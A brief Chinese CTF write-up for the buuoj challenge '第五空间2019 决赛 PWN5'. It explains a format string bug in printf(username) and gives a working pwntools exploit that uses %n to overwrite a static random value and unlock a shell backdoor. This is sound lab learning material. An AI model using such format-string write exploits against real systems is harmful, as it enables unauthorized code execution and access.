# [第五空间2019 决赛]PWN5

From buuoj.

## 文件分析

下载`pwn`，NX on, PIE on, RELRO partial  
ghidra分析为32位程序

## 解题思路

找到main函数后，发现输入username和passwd，并且存在后门：当passwd==randint时，打开sh，其中randint从文件读入为随机数  
由于读入的username和passwd长度等于其数组长度，无法考虑 **栈溢出** ，转而考虑对`atoi()`的利用

> Day 2

由于username在函数`printf`中，因此应当考虑格式化字符串漏洞将指定数值注入`randint`

## EXPLOIT

经过gdb调试可知，变量`username`所在地址比printf第一个参数的地址高0x28，即10个DWORD  
构造以下exp：

```python
from pwn import *
sh = process('pwn5')

# 静态变量randint的地址为0x0804c044
sh.sendline(b'aa$12%nx' + p32(0x0804c044))
# arg10: 'aa$1', arg11: '2%nx', arg12: 0x0804c044
#即将2（成功打印aa 2个字符）写入randint中

sh.sendline(b'2')
sh.interactive()
#输入cat flag取得flag

sh.close()
```
Done.
